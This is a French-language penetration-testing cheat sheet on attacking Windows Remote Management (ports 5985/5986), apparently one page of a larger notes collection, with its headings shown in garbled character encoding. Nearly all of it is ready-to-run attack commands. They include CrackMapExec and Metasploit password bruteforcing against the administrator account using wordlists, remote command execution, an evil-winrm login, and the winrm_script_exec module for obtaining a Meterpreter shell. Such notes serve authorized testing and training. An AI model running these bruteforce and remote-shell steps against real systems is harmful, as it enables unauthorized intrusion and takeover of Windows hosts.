# ü™ü √ânum√©ration WinRM

[‚Üê Retour √† la table des mati√®res](../README.md)

## Ports par d√©faut : 5985 (HTTP), 5986 (HTTPS)

## Bruteforce WinRM

### CrackMapExec ‚Üí [üìñ Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Bruteforce avec CrackMapExec
crackmapexec winrm targetIP -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Ex√©cution de commandes apr√®s authentification
crackmapexec winrm targetIP -u administrator -p password -x "sysinfo"
```

### Metasploit
```bash
# Scanner de login WinRM
use auxiliary/scanner/winrm/winrm_login
set RHOSTS targetIP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

## Ex√©cution de commandes

### Metasploit - WinRM CMD
```bash
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS targetIP
set USERNAME administrator
set PASSWORD password
set CMD whoami
run
```

### Evil-WinRM
```bash
# Connexion avec Evil-WinRM
evil-winrm.rb -u username -p 'password' -i targetIP
```

## Meterpreter via WinRM
```bash
# Metasploit exploit pour Meterpreter
use exploit/windows/winrm/winrm_script_exec
set RHOSTS targetIP
set USERNAME administrator
set PASSWORD password
set FORCE_VBS true
run
```